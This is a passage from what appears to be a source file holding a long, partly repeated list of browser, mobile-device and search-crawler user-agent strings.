               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
